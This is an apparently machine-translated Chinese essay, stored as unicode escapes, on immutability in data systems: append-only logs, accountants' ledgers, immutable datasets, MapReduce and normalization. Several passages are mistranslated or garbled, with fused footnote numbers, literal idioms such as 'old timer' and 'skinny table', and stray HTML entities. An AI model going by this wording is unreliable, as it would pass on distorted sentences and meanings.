\u5728\u4ec5\u9644\u52a0\u8ba1\u7b97\u4e2d\uff0c\u5c06\u6c38\u8fdc\u5f55\u5236\u89c2\u5bdf\uff08\u6216\u957f\u65f6\u95f4\uff09\u3002\u5bfc\u51fa\u7684\u7ed3\u679c\u6309\u9700\u8ba1\u7b97\uff08\u6216\u5b9a\u671f\u9884\u5148\u8ba1\u7b97\uff09\u3002 \n\u8fd9\u7c7b\u4f3c\u4e8eDBMS\uff08\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\uff09\uff0c\u5176\u4e2d\u4e8b\u52a1\u65e5\u5fd7\u8bb0\u5f55\u5bf9\u6570\u636e\u5e93\u6240\u505a\u7684\u6240\u6709\u66f4\u6539\u3002\u9ad8\u901f\u9644\u5f55\u662f\u66f4\u6539\u65e5\u5fd7\u7684\u552f\u4e00\u65b9\u6cd5\u3002\u4ece\u8fd9\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u6570\u636e\u5e93\u7684\u5185\u5bb9\u8f7d\u6709\u65e5\u5fd7\u4e2d\u6700\u65b0\u8bb0\u5f55\u503c\u7684\u7f13\u5b58\u3002\u4e8b\u5b9e\u662f\u65e5\u5fd7\u3002\u6570\u636e\u5e93\u662f\u65e5\u5fd7\u5b50\u96c6\u7684\u7f13\u5b58\u3002\u7f13\u5b58\u7684\u5b50\u96c6\u6070\u597d\u662f\u6765\u81ea\u65e5\u5fd7\u7684\u6bcf\u4e2a\u8bb0\u5f55\u548c\u7d22\u5f15\u503c\u7684\u6700\u65b0\u503c\u3002\n   \u4f1a\u8ba1\u5e08\u4e0d\u4f7f\u7528\u6a61\u76ae\u64e6;\u5426\u5219\u4ed6\u4eec\u53ef\u80fd\u4f1a\u5165\u72f1\u3002\u5206\u7c7b\u5e10\u4e2d\u7684\u6240\u6709\u6761\u76ee\u90fd\u4fdd\u7559\u5728\u5206\u7c7b\u5e10\u4e2d\u3002\u53ef\u4ee5\u901a\u8fc7\u5728\u5206\u7c7b\u5e10\u4e2d\u5236\u4f5c\u65b0\u6761\u76ee\u6765\u8fdb\u884c\u66f4\u6b63\u3002\u5f53\u4e00\u5bb6\u516c\u53f8\uff06\uff0339;\u5b63\u5ea6\u7ed3\u679c\u53d1\u8868\u65f6\uff0c\u5b83\u4eec\u5305\u62ec\u5bf9\u4e0a\u4e00\u5b63\u5ea6\u7684\u5c0f\u89c4\u5219\u3002\u5c0f\u4fee\u590d\u5f88\u597d\u3002\u4ed6\u4eec\u4e5f\u662f\u9644\u52a0\u7684\u3002\n \u6709\u4e9b\u6761\u76ee\u63cf\u8ff0\u4e86\u89c2\u5bdf\u5230\u7684\u4e8b\u5b9e\u3002\u4f8b\u5982\uff0c\u63a5\u6536\u501f\u8bb0\u6216\u53cd\u5bf9\u652f\u7968\u8d26\u6237\u7684\u4fe1\u8d37\u662f\u89c2\u5bdf\u5230\u7684\u4e8b\u5b9e\u3002\u6709\u4e9b\u6761\u76ee\u63cf\u8ff0\u4e86\u6d3e\u751f\u4e8b\u5b9e\uff0c\u8fd9\u610f\u5473\u7740\u57fa\u4e8e\u89c2\u5bdf\uff0c\u53ef\u4ee5\u8ba1\u7b97\u65b0\u7684\u4e1c\u897f\u3002\u4f8b\u5982\uff0c\u57fa\u4e8e\u901f\u7387\u548c\u6210\u672c\u7684\u644a\u9500\u8d44\u672c\u5f00\u652f\u662f\u5bfc\u51fa\u7684\u4e8b\u5b9e\u3002\u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f\u5f53\u524d\u94f6\u884c\u8d26\u6237\u4f59\u989d\u4e0e\u5e94\u7528\u501f\u8bb0\u548c\u4fe1\u7528\u3002\n   \u5355\u7a0b\u8ba1\u7b97\u610f\u5473\u7740\u4ee5\u67d0\u79cd\u65b9\u5f0f\u6392\u5e8f\u66f4\u6539\u3002\u8ba2\u5355\u53ef\u4ee5\u6765\u81ea\u96c6\u4e2d\u5f0f\u4e3b\u7ad9\u6216\u4e00\u4e9b\u7c7b\u4f3cPAXOS\u768411\u4e2a\u5206\u5e03\u5f0f\u534f\u8bae\uff0c\u63d0\u4f9b\u4e32\u884c\u6392\u5e8f\u3002\u5728\u8bed\u4e49\u4e0a\u4e00\u6b21\u5e94\u7528\u66f4\u6539\uff0c\u5e76\u4ee5\u5176\u524d\u8f88\u5206\u5c42\u3002\u65b0\u4ef7\u503c\u53d6\u4ee3\u65e7\u7684\u503c\u3002\u8fd9\u65b9\u9762\u7684\u7c92\u5ea6\u53ef\u4ee5\u662f\u5173\u7cfb\u5b58\u50a8\u4e2d\u7684\u4e00\u7ec4\u8bb0\u5f55\u6216\u6587\u6863\u7684\u65b0\u7248\u672c\u3002\u5206\u5e03\u5f0f\u7684\u5355\u4e3b\u8ba1\u7b97\u610f\u5473\u7740\u5b58\u5728\u4e00\u4e2a\u6570\u636e\uff08\u5173\u7cfb\u8bb0\u5f55\uff0c\u6587\u6863\uff0c\u5bfc\u51fa\u6587\u4ef6\u7b49\uff09\uff0c\u5b83\u4ece\u4e00\u4e2a\u903b\u8f91\u4f4d\u7f6e\u53d1\u51fa\u65b0\u7248\u672c\u968f\u65f6\u95f4\u7684\u65b0\u7248\u672c\u3002\n   \u5728\u7535\u8bdd\u4e4b\u524d\uff0c\u4eba\u4eec\u4f7f\u7528\u7684\u4f7f\u8005 - \u7ecf\u5e38\u5b69\u5b50\u4eec\u8d70\u8def\u7a7f\u8fc7\u57ce\u9547\u4ea4\u4ed8\u4fe1\u606f\u3002\u6216\u8005\uff0c\u90ae\u653f\u670d\u52a1\u63d0\u4f9b\u4e86\u5f88\u957f\u65f6\u95f4\u7684\u6d88\u606f\u3002\u6709\u65f6\u4eba\u4eec\u4f7f\u7528\u5e7b\u60f3\u5f62\u5f0f\u6709\u8bb8\u591a\u5c42\uff0c\u6bcf\u4e2a\u989c\u8272\u90fd\u6709\u4e0d\u540c\u7684\u989c\u8272\u3002\u9875\u9762\u4e0a\u6709\u591a\u4e2a\u90e8\u5206\u3002\u6bcf\u4e2a\u53c2\u4e0e\u8005\u90fd\u586b\u5199\u4e86\u4e00\u8282\uff08\u7528\u7b14\u6309\u538b\uff09\uff0c\u7136\u540e\u4ece\u8868\u683c\u7684\u540e\u9875\u4e0a\u6495\u4e0b\u5e76\u63d0\u4ea4\u5b83\u3002\u6bcf\u4e2a\u53c2\u4e0e\u8005\u90fd\u6709\u6240\u9700\u7684\u6570\u636e\u5e76\u5c06\u66f4\u591a\u7684\u6570\u636e\u6dfb\u52a0\u5230\u8868\u5355\u4e2d\u3002\u65e9\u671f\u7684\u90e8\u5206\u65e0\u6cd5\u66f4\u65b0;\u6570\u636e\u53ea\u80fd\u9644\u52a0\u5230\u6700\u540e\u3002\n \u5728\u8ba1\u7b97\u673a\u4e4b\u524d\uff0c\u5de5\u4f5c\u6d41\u7a0b\u7ecf\u5e38\u4ee5\u7eb8\u5f20\u5f62\u5f0f\u6355\u83b7\uff0c\u8868\u5355\u4e0a\u7684\u591a\u4e2a\u90e8\u5206\u548c\u591a\u9875\uff08\u4f8b\u5982\uff0c\uff06\uff0334;\u586b\u5199\u7b2c3\u90e8\u5206\uff0c\u5e76\u4ece\u540e\u9762\uff06\uff0334\u4fdd\u7559GoldenRod\u9875\u9762;\uff09\u3002\u8fd9\u4e2a\uff06\uff0334;\u5206\u5e03\u5f0f\u8ba1\u7b97\uff06\uff0334;\u4ec5\u9650\u7533\u8bf7\u3002\u65b0\u6d88\u606f\u662f\u8868\u683c\u7684\u65b0\u6d88\u606f - \u6bcf\u4e2a\u90fd\u662f\u4e00\u4e2a\u7248\u672c\uff0c\u6bcf\u4e2a\u90fd\u662f\u4e0d\u53ef\u53d8\u7684\u3002\u4f60\u6c38\u8fdc\u4e0d\u4f1a\u88ab\u5141\u8bb8\u8986\u76d6\u5199\u7684\u4e1c\u897f\u3002\n   \u4ee4\u4eba\u60ca\u8bb6\u7684\u662f\uff08\u5bf9\u4e8e\u6570\u636e\u5e93\u65e7\u8ba1\u65f6\u5668\uff09\uff0c\u5e76\u975e\u6240\u6709\u6570\u636e\u90fd\u4fdd\u5b58\u5728\u5173\u7cfb\u6570\u636e\u5e93\u7cfb\u7edf\u4e2d\u3002\u672c\u8282\uff08\u57fa\u4e8e\u65e9\u671f\u6587\u4ef67\uff09\u8ba8\u8bba\u4e86\u89e3\u9501\u6570\u636e\u7684\u4e00\u4e9b\u542b\u4e49\u3002 \n\u5185\u90e8\u7684\u6570\u636e\u662f\u6307\u7531\u7ecf\u5178\u5173\u7cfb\u6570\u636e\u5e93\u7cfb\u7edf\u53ca\u5176\u5468\u56f4\u7684\u5e94\u7528\u7a0b\u5e8f\u4ee3\u7801\u4fdd\u5b58\u548c\u7ba1\u7406\u7684\u5185\u5bb9\u3002\u6709\u65f6\u8fd9\u88ab\u79f0\u4e3a\u670d\u52a1\u3002\n \u5185\u90e8\u7684\u6570\u636e\u751f\u6d3b\u5728\u4ea4\u6613\u4e16\u754c\u4e2d\uff0c\u4ee5\u53ef\u5e8f\u5217\u5316\u7684\u65b9\u5f0f\u5e94\u7528\u7684\u53d8\u5316\uff08\u6216\u63a5\u8fd1\u8be5\u95ee\u9898\uff09\u3002\n   \u5916\u90e8\u7684\u6570\u636e\u88ab\u51c6\u5907\u4e3a\u6d88\u606f\uff0c\u6587\u4ef6\uff0c\u6587\u6863\u548c/\u6216\u7f51\u9875\u3002\u8fd9\u4e9b\u662f\u4ece\u4e00\u4e2a\u670d\u52a1\u4e2d\u53d1\u9001\u5230\u4e16\u754c\u7684\u670d\u52a1\u3002\u9664\u4e86\u4f7f\u7528\u6570\u636e\u5e93\u4e4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u7531\u5176\u4ed6\u673a\u5236\u521b\u5efa\u5916\u90e8\u6570\u636e\u3002\n   *\u88ab\u89e3\u9501\u3002\u5b83\u672a\u9501\u5b9a\u5728\u6570\u636e\u5e93\u4e2d\u3002\u63d0\u53d6\u5e76\u53d1\u9001\u5916\u90e8\u526f\u672c\u3002\n *\u6709\u8eab\u4efd\u3002\u5728\u5916\u9762\u53d1\u9001\u65f6\uff0c\u8fd9\u4e9b\u6587\u4ef6\uff0c\u6587\u6863\u548c\u90ae\u4ef6\u5177\u6709\u552f\u4e00\u7684\u6807\u8bc6\uff08\u53ef\u80fd\u662fURL\uff09\u3002\n *\u53ef\u80fd\u662f\u7248\u672c\u7684\u3002\u66f4\u65b0Aren\uff06\uff0339; t\u66f4\u65b0\u4f46\u5177\u6709\u65b0\u552f\u4e00\u6807\u8bc6\u7b26\u7684\u65b0\u7248\u672c\u3002\n   \u5185\u90e8\u6570\u636e\u4e0e\u5916\u90e8\u6570\u636e\u7684\u8868\u793a\uff0c\u542b\u4e49\u548c\u4f7f\u7528\u60c5\u51b5\u5b58\u5728\u6df1\u523b\u5dee\u5f02\u3002\u8d8a\u6765\u8d8a\u591a\u5730\uff0c\u6570\u636e\u88ab\u89c6\u4e3a\u5916\u90e8\uff08\u4e0d\u53ef\u53d8\uff09\u6570\u636e\uff08\u53c2\u89c1\u56fe2\uff09\u3002 \n\u6570\u636e\u96c6\u662f\u5177\u6709\u552f\u4e00ID\u7684\u6570\u636e\u96c6\u5408\u3002\u67d0\u4e9b\u6570\u636e\u96c6\u5177\u6709\u4e0e\u5177\u6709\u67b6\u6784\u7684\u591a\u4e2a\u8868\u7684\u7ed3\u6784\u3002\u5982\u4f55\u7531\u5173\u7cfb\u6570\u636e\u5e93\u5f15\u7528\u7684\u8fd9\u4e9b\u6570\u636e\u96c6\uff0c\u4ee5\u53ca\u5173\u7cfb\u8fd0\u7b97\u7b26\u5982\u4f55\u8de8\u8d8aDBMS\u548c\u6570\u636e\u96c6\uff1f\n   \u6570\u636e\u96c6\u662f\u4e00\u4e2a\u56fa\u5b9a\u548c\u4e0d\u53ef\u53d8\u7684\u8868\u7ec4\u3002\u5728\u6570\u636e\u96c6\u4e2d\u6355\u83b7\u6bcf\u4e2a\u8868\u7684\u6a21\u5f0f\u3002\u521b\u5efa\u6570\u636e\u96c6\u65f6\u6355\u83b7\u6bcf\u4e2a\u8868\u7684\u5185\u5bb9\u3002\u7531\u4e8e\u6570\u636e\u96c6\u662f\u4e0d\u53ef\u53d8\u7684\uff0c\u56e0\u6b64\u521b\u5efa\u5b83\uff0c\u53ef\u4ee5\u6d88\u8017\u8bfb\u53d6\uff0c\u7136\u540e\u5220\u9664\u3002\u6570\u636e\u96c6\u53ef\u4ee5\u662f\u5173\u7cfb\uff0c\u6216\u8005\u5b83\u4eec\u53ef\u4ee5\u5177\u6709\u4e00\u4e9b\u5176\u4ed6\u8868\u793a\uff0c\u4f8b\u5982\u56fe\u5f62\uff0c\u8bf8\u5982JSON\uff08JavaScript\u5bf9\u8c61\u7b26\u53f7\uff09\u6216\u4efb\u4f55\u5176\u4ed6\u8868\u793a\u7684\u5c42\u6b21\u7ed3\u6784\uff08\u56fe3\uff09\u3002\u6570\u636e\u96c6\u662f\u4e00\u4e2a\u903b\u8f91\u96c6\u7684\u4e0d\u53ef\u53d8\u5f62\u8868\u4ee5\u53ca\u5176\u6a21\u5f0f\u3002\n    \u6570\u636e\u96c6\u53ef\u4ee5\u7531RDBMS\uff08\u5173\u7cfbDBMS\uff09\u5f15\u7528\u3002 DBMS\u53ef\u89c1\u5143\u6570\u636e\u3002\u5373\u4f7f\u53ef\u80fd\u65e0\u6cd5\u66f4\u65b0\uff0c\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u6570\u636e\u3002\u5373\u4f7f\u5b83\u7269\u7406\u5b58\u50a8\u5728\u5176\u4ed6\u5730\u65b9\uff0c\u4e5f\u53ef\u4ee5\u5728\u5173\u7cfb\u7cfb\u7edf\u5185\u8fdb\u884c\u8bed\u4e49\u4e0a\u5b58\u5728\u6570\u636e\u96c6\u3002\u56e0\u4e3a\u6570\u636e\u96c6\u662f\u4e0d\u53ef\u53d8\u7684\uff0c\u6240\u4ee5\u6ca1\u6709\u5fc5\u8981\u9501\u5b9a\uff0c\u5e76\u4e14\u4e0d\u62c5\u5fc3\u63a7\u5236\u66f4\u65b0\u3002\n   \u529f\u80fd\u8ba1\u7b97\u9700\u8981\u4e00\u7ec4\u8f93\u5165\uff0c\u5e76\u4e14\u53ef\u9884\u6d4b\u5730\u521b\u5efa\u4e00\u7ec4\u8f93\u51fa\u3002\u8fd9\u53ef\u80fd\u5728\u5173\u7cfb\u6570\u636e\u5e93\u4e2d\u7684\u9501\u5b9a\u6216\u5feb\u7167\u6570\u636e\u7684\u67e5\u8be2\u53d1\u751f\uff0c\u5e76\u4e14\u53ef\u4ee5\u5728\u5927\u6570\u636eMapReduce\u98ce\u683c\u7cfb\u7edf\u4e0a\u53d1\u751f\u3002\u5728\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u4ecd\u7136\u5b58\u5728\u4e0d\u53d8\u7684\u6570\u636e\u96c6\u5408\u3002\u901a\u8fc7\u5feb\u7167\u6216\u67d0\u79cd\u5f62\u5f0f\u7684\u9694\u79bb\uff0c\u6570\u636e\u5e93\u6570\u636e\u5bf9\u4e8e\u8ba1\u7b97\u6301\u7eed\u65f6\u95f4\u6765\u8bf4\u662f\u8bed\u4e49\u4e0a\u7684\u3002\u901a\u8fc7\u5927\u6570\u636e\u8ba1\u7b97\uff0c\u8f93\u5165\u901a\u5e38\u5b58\u50a8\u5728GFS\uff08Google\u6587\u4ef6\u7cfb\u7edf\uff09\u6216HDFS\uff08Hadoop\u5206\u5e03\u5f0f\u6587\u4ef6\u7cfb\u7edf\uff09\u6587\u4ef6\u4e2d\u3002\n \u5728\u90a3\u91cc\u6ca1\u6709\u8bed\u4e49\u969c\u788d\uff0c\u53ef\u4ee5\u5728\u5b58\u50a8\u5728\u5173\u7cfb\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u548c\u5b58\u50a8\u5728\u5916\u90e8\u6570\u636e\u96c6\u4e2d\u7684\u6570\u636e\u4e2d\u8fdb\u884c\u8fde\u63a5\u3002\u9501\u5b9a\uff08\u6216\u5feb\u7167\u9694\u79bb\uff09\u63d0\u4f9b\u4e86\u53ef\u4ee5\u52a0\u5165\u7684\u5173\u7cfb\u6570\u636e\u5e93\u7684\u7248\u672c\u3002\u547d\u540d\u548c\u51bb\u7ed3\u6570\u636e\u96c6\u53ef\u4ee5\u4e0e\u5173\u7cfb\u6570\u636e\u52a0\u5165\uff08\u53c2\u89c1\u56fe4\uff09\u3002\u60a8\u53ef\u4ee5\u5c06\u5728DBMS\u4e2d\u4fdd\u5b58\u7684\u6570\u636e\u548c\u5728\u4e0d\u53ef\u53d8\u6570\u636e\u96c6\u4e2d\u4fdd\u5b58\u7684\u6570\u636e\u4e2d\u6709\u610f\u4e49\u5730\u5e94\u7528\u5173\u7cfb\u3002\n  \u5728\u67d0\u4e9b\u65b9\u9762\uff0c\u5728\u4e0d\u53ef\u53d8\u6570\u636e\u96c6\u548c\u5173\u7cfb\u6570\u636e\u5e93\u4e2d\u5de5\u4f5c\u7684\u80fd\u529b\u4ee4\u4eba\u60ca\u8bb6\u3002\u4f7f\u7528\u6807\u8bc6\u548c\u53ef\u9009\u7248\u672c\u5b9a\u4e49\u4e0d\u53ef\u6539\u53d8\u7684\u6570\u636e\u96c6\u3002\u5b83\u7684\u67b6\u6784\uff0c\u5176\u63cf\u8ff0\u4e86\u5728\u521b\u5efa\u65f6\u7684\u6570\u636e\u96c6\u7684\u5f62\u72b6\u548c\u5f62\u5f0f\uff0c\u662f\u63cf\u8ff0\u6027\u7684\uff0c\u800c\u5728RDBMS\u4e2d\u4fdd\u6301\u7684\u6a21\u5f0f\u662f\u89c4\u8303\u6027\u7684\u3002\n \u8be5\u56fe\u6848\u526a\u88c1\u4e3a\u878d\u5408\u7684\u6a21\u5f0f\uff0c\u4e24\u4e2a\u8fde\u63a5\u6570\u636e\u96c6\u7684\u6a21\u5f0f\uff08\u5199\u5165\u65f6\u5199\u5165\u5176\u6570\u636e\uff09\u4e0eRDBMS\u7684\u67b6\u6784\uff08\u63cf\u8ff0\u5176\u4f5c\u4e3a\u5feb\u7167\u7684\u6570\u636e\uff09\u3002\u6b64\u5916\uff0c\u8054\u63a5\u548c\u5176\u4ed6\u5173\u7cfb\u8fd0\u7b97\u7b26\u5fc5\u987b\u5fc5\u987b\u5c06\u6570\u636e\u96c6\u7684\u5185\u5bb9\u7ec4\u5408\u4e3a\u89e3\u91ca\u4e3a\u4e00\u7ec4\u5173\u7cfb\u8868\u3002\u8fd9\u4e00\u4e2a\u7533\u8bf7\u6570\u636e\u96c6\u4e2d\u7684\u6807\u8bc6\u6982\u5ff5\uff0c\u5e76\u4e13\u6ce8\u4e8e\u8868\u683c\uff0c\u4ee5\u89e3\u91ca\u4e3a\u5728\u884c\u548c\u5217\u4e2d\u4fdd\u6301\u7684\u4e00\u7ec4\u503c\u3002 \n\u5373\u4f7f\u5728\u5c01\u9762\u4e0b\u6539\u53d8\uff0c\u6d88\u8d39\u8005\u53ef\u80fd\u4f1a\u5c06\u6570\u636e\u96c6\u89c6\u4e3a\u4e0d\u53ef\u53d8\u3002\n   \u6570\u636e\u96c6\u662f\u8bed\u4e49\u4e0a\u4e0d\u53ef\u53d8\u7684\u3002\u5b83\u6709\u4e00\u7ec4\u8868\uff0c\u884c\u548c\u5217\u3002\u5b83\u4e5f\u53ef\u80fd\u5177\u6709\u534a\u7ed3\u6784\u5316\u6570\u636e\uff08\u4f8b\u5982\uff0cJSON\uff09\u3002\u5b83\u53ef\u80fd\u5177\u6709\u4e13\u6709\u683c\u5f0f\u7684\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u3002\n \u6570\u636e\u96c6\u53ef\u4ee5\u88ab\u5b9a\u4e49\u4e3a\u9009\u62e9\uff0c\u6295\u5f71\u6216\u52a0\u5165\u4ee5\u524d\u73b0\u6709\u7684\u6570\u636e\u96c6\u3002\u8bed\u4e49\u4e0a\uff0c\u6240\u6709\u6570\u636e\u73b0\u5728\u90fd\u662f\u65b0\u6570\u636e\u96c6\u7684\u4e00\u90e8\u5206\u3002\n \u4ec0\u4e48\uff06\uff0339;\u5bf9\u4e8e\u6570\u636e\u96c6\u91cd\u8981\u7684\u662f\uff0c\u4ece\u8bfb\u8005\u7684\u89d2\u5ea6\u770b\u8d77\u6765\u4f3c\u4e4e\u4e0d\u53d8\u3002\n   \u6570\u636e\u96c6\u662f\u8bed\u4e49\u4e0a\u4e0d\u53ef\u53d8\u7684\uff0c\u4f46\u53ef\u4ee5\u7269\u7406\u53d8\u5316\u3002\u60a8\u53ef\u4ee5\u6dfb\u52a0\u7d22\u5f15\u6216\u4e24\u4e2a\u3002\u5b83\u53ef\u4ee5\u4e3aDenormalize\u8868\u63d0\u4f9b\u4f18\u5316\u8bfb\u53d6\u8bbf\u95ee\u3002\u6570\u636e\u96c6\u53ef\u4ee5\u5206\u533a\uff0c\u5e76\u4e14\u9760\u8fd1\u8bfb\u8005\u7684\u90e8\u5206\u3002\u5b9a\u5411\u5217\u7684\u6570\u636e\u96c6\u8868\u793a\u4e5f\u53ef\u80fd\u6709\u610f\u4e49\u3002\n \u60a8\u53ef\u4ee5\u5236\u4f5c\u4e00\u4e2a\u8868\u7684\u526f\u672c\uff0c\u5217\u8f83\u5c11\uff0c\u4ee5\u4f18\u5316\u5feb\u901f\u8bbf\u95ee\uff08\u4e00\u4e2a\u7626\u684c\uff09\u3002\u5217\u503c\u53ef\u4ee5\u7559\u5728\u7626\u684c\u5b50\u548c\u8102\u80aa\u8868\u4e2d\u3002\n \u901a\u8fc7\u89c2\u5bdf\u548c\u76d1\u89c6\u6570\u636e\u96c6\u7684\u8bfb\u53d6\u4f7f\u7528\uff0c\u60a8\u53ef\u4ee5\u610f\u8bc6\u5230\u65b0\u7684\u4f18\u5316\uff08\u4f8b\u5982\uff0c\u65b0\u7d22\u5f15\uff09\u662f\u53ef\u80fd\u7684\u3002 \n\u4e0d\u53d8\u6027\u662f\u5927\u6570\u636e\u7684\u9aa8\u5e72\u3002\u5927\u89c4\u6a21\u5e76\u884c\u8ba1\u7b97\u57fa\u4e8e\u4e0d\u53ef\u53d8\u8f93\u5165\u548c\u529f\u80fd\u8ba1\u7b97\u3002 MapReduce 3\u548cDryad 9\u90fd\u5c06\u4e0d\u53ef\u53d8\u6587\u4ef6\u4f5c\u4e3a\u8f93\u5165\u3002\u5c06\u5de5\u4f5c\u5207\u6210\u788e\u7247\uff0c\u6bcf\u4e2a\u90fd\u5177\u6709\u4e0d\u53d8\u7684\u8f93\u5165\u3002\u6b64\u529f\u80fd\u8ba1\u7b97\uff08\u4f7f\u7528\u4e0d\u53ef\u53d8\u8f93\u5165\uff09\u662f\u5e42\u7b49\u7684\uff0c\u4f7f\u5f97\u53ef\u4ee5\u5931\u8d25\u5e76\u91cd\u65b0\u542f\u52a8\u3002\u4e0d\u53d8\u6027\u662f\u5927\u6570\u636e\u7684\u9aa8\u5e72\u3002 MapReduce\u901a\u8fc7\u4e0d\u53ef\u53d8\u6570\u636e\u6267\u884c\u529f\u80fd\u8ba1\u7b97\u4ee5\u521b\u5efa\u4e0d\u53ef\u53d8\u8f93\u51fa\u3002\u5931\u8d25\u5e76\u91cd\u65b0\u542f\u52a8\uff0c\u8fd9\u5bf9\u4e8e\u53ef\u9760\u7684\u5927\u6570\u636e\u81f3\u5173\u91cd\u8981\uff0c\u57fa\u4e8e\u529f\u80fd\u8ba1\u7b97\u7684\u5e42\u7b49\u6027\u8d28\u3002\n   \u6570\u636e\u96c6\u663e\u793a\u4e86\u4e00\u4e2a\u4e0d\u53ef\u53d8\u7684\u8bed\u4e49\u68f1\u955c\uff0c\u5373\u4f7f\u57fa\u7840\u8868\u793a\u662f\u589e\u5f3a\u6216\u5b8c\u5168\u66ff\u6362\u7684\u3002\u56fd\u738b\u8a79\u59c6\u65af\u5723\u7ecf\u662f\uff0c\u89d2\u8272\u7684\u6027\u683c\uff0c\u5373\u4f7f\u662f\u5728\u4e0d\u540c\u7684\u5b57\u4f53\u4e0a\u5370\u5237;\u5373\u4f7f\u5728\u6570\u5b57\u5316\u65f6;\u5373\u4f7f\u4f34\u968f\u7740\u4e0d\u540c\u7684\u56fe\u7247\u3002\n \u5982\u679c\u5bf9\u65b0\u67b6\u6784\u8868\u793a\u6709\u6ca1\u6709\u53d8\u6362\uff0c\u5219\u6570\u636e\u96c6\u662f\u66f4\u6539\u7684\u5417\uff1f\u65b0\u5730\u5740\u5b57\u6bb5\u662f\u5426\u53ef\u4ee5\u5177\u6709\u66f4\u591a\u5bb9\u91cf\uff1f\u679a\u4e3e\u503c\u662f\u5426\u53ef\u4ee5\u6620\u5c04\u5230\u65b0\u7684\u5e95\u5c42\u8868\u793a\uff1f\u6570\u636e\u662f\u5426\u53ef\u4ee5\u4eceUTF-8\u6620\u5c04\u5230UTF-16\u7f16\u7801\uff1f\n \u5177\u6709\u6b63\u786e\u7684\u4f4d\u662f\u4e0d\u591f\u7684\u3002\u4f60\u5fc5\u987b\u77e5\u9053\u5982\u4f55\u89e3\u91ca\u5b83\u4eec\u3002\u4f8b\u5982\uff0c\uff06\uff0334;\u5e03\u4ec0\u603b\u7edf\uff06\uff0334; 1990\u5e74\u7684\u542b\u4e49\u4e0d\u540c\u4e8e2005\u5e74\u3002\u5355\u8bcd\uff06\uff0334;\u9910\u5dfe\u7eb8\uff06\uff0334;\u5728\u7f8e\u56fd\u548c\u82f1\u56fd\u88ab\u89e3\u91ca\u4e0d\u540c\u3002\n   \u521b\u5efa\u4e0d\u53ef\u53d8\u6570\u636e\u96c6\u65f6\uff0c\u53ef\u80fd\u4e0d\u4f1a\u66f4\u6539\u6570\u636e\u7684\u8bed\u4e49\u3002\u4ec5\u5185\u5bb9\u53ea\u80fd\u63cf\u8ff0\u5b83\u4eec\u5728\u521b\u5efa\u6570\u636e\u96c6\u65f6\u3002\n \u5927\u591a\u6570\u7a0b\u5e8f\u5458\u7528\u4e8eSQL DDL\uff08\u6570\u636e\u5b9a\u4e49\u8bed\u8a00\uff09\u652f\u6301\u5176\u8868\u7684\u5143\u6570\u636e\u4e2d\u7684\u52a8\u6001\u53d8\u5316\u3002\u8fd9\u53d1\u751f\u5728\u4ea4\u6613\u8fb9\u754c\u5904\uff0c\u5e76\u4e14\u53ef\u4ee5\u4e3a\u73b0\u6709\u6570\u636e\u89c4\u5b9a\u65b0\u7684\u67b6\u6784\u3002 SQL DDL\u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u89c4\u8303\u6027\u5143\u6570\u636e\uff0c\u56e0\u4e3a\u5b83\u662f\u89c4\u5b9a\u8868\u793a\u7684\uff08\u53ef\u80fd\u4f1a\u6539\u53d8\uff09\u3002\u4e0d\u53ef\u53d8\u6570\u636e\u96c6\u5177\u6709\u63cf\u8ff0\u6027\u5143\u6570\u636e\uff0c\u7528\u4e8e\u89e3\u91ca\u6709\u54ea\u4e9b\uff06\uff0339;\n \u5f53\u7136\uff0c\u53ef\u4ee5\u521b\u5efa\u5f15\u7528\u4e00\u4e2a\u6216\u591a\u4e2a\u73b0\u6709\u6570\u636e\u96c6\u7684\u65b0\u6570\u636e\u96c6\uff0c\u4ee5\u4fbf\u521b\u5efa\u5176\u6570\u636e\u7684\u65b0\u8868\u793a\u3002\u6bcf\u4e2a\u65b0\u7684\u6570\u636e\u96c6\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684ID\u3002\u5728\u5176\u4e2d\u901a\u8fc7\u5f15\u7528\u5b9e\u73b0\u7684\u6570\u636e\u96c6\u800c\u4e0d\u662f\u6309\u503c\u5b9e\u73b0\u7684\u6570\u636e\u96c6\u6ca1\u6709\u9519\u3002 \n\u6807\u51c6\u5316\u7684\u76ee\u6807\u662f\u6d88\u9664\u66f4\u65b0\u5f02\u5e38\u3002\u5f53\u6570\u636e\u672a\u4ee5\u5f52\u4e00\u5316\u65b9\u5f0f\u5b58\u50a8\u65f6\uff0c\u66f4\u65b0\u53ef\u80fd\u4f1a\u4ea7\u751f\u4ee4\u4eba\u4e0d\u5feb\u7684\u7ed3\u679c\u3002\u7ecf\u5178\u699c\u6837\u662f\u4e00\u4e2a\u4e0d\u5b8c\u7f8e\u7684\u5f52\u4e00\u4e0b\u8868\uff0c\u5176\u4e2d\u6bcf\u4e2a\u5458\u5de5\u90fd\u6709\u4ed6\u6216\u5979\u7684\u7ecf\u7406\uff06\uff0339;\u59d3\u540d\u548c\u7535\u8bdd\u53f7\u7801\u3002\u8fd9\u4f7f\u5f97\u66f4\u65b0\u7ba1\u7406\u5458\u548c\uff0339; S\u7535\u8bdd\u53f7\u7801\u5f88\u96be\uff0c\u56e0\u4e3a\u5b83\u5b58\u50a8\u5728\u8bb8\u591a\u5730\u65b9\u3002\u5f52\u4e00\u5316\u5728\u8bbe\u8ba1\u7528\u4e8e\u66f4\u65b0\u7684\u6570\u636e\u5e93\u4e2d\u975e\u5e38\u91cd\u8981\u3002\n \u7136\u800c\uff0c\u5728\u4e0d\u53ef\u53d8\u6570\u636e\u96c6\u4e2d\u4e0d\u9700\u8981\u5f52\u4e00\u5316\u3002\u6b63\u5e38\u5316\u4e0d\u53d8\u6570\u636e\u96c6\u7684\u552f\u4e00\u539f\u56e0\u53ef\u80fd\u662f\u51cf\u5c11\u5b83\u4eec\u6240\u9700\u7684\u5b58\u50a8\u3002\u53e6\u4e00\u65b9\u9762\uff0cDenormized\u6570\u636e\u96c6\u53ef\u80fd\u66f4\u5bb9\u6613\u4e14\u66f4\u5feb\u5730\u5904\u7406\u8ba1\u7b97\u5230\u8ba1\u7b97\u7684\u8f93\u5165\u3002\n   